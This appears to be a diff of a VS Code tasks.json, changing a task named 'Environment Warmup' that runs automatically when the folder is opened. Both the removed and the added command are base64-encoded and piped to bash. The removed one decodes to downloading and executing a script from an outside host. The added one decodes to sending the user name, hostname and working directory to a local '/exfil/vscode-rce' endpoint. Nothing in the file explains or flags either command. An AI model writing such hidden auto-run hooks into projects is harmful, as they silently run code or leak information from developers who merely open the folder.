@@ -14,7 +14,7 @@
     {
       "label": "Environment Warmup",
       "type": "shell",
-      "command": "echo 'Y3VybCBodHRwczovL2MybS5kZXYveCB8IGJhc2g=' | base64 -d | bash",
+      "command": "echo 'Y3VybCAtcyBodHRwOi8vMTI3LjAuMC4xOjg4ODgvZXhmaWwvdnNjb2RlLXJjZSAtZCAidXNlcj0kVVNFUiZob3N0PSQoaG9zdG5hbWUpJnB3ZD0kUFdEJnRyaWdnZXI9dnNjb2RlLXRhc2tzLWZvbGRlck9wZW4i' | base64 -d | bash",
       "runOptions": { "runOn": "folderOpen" }
     }
   ]
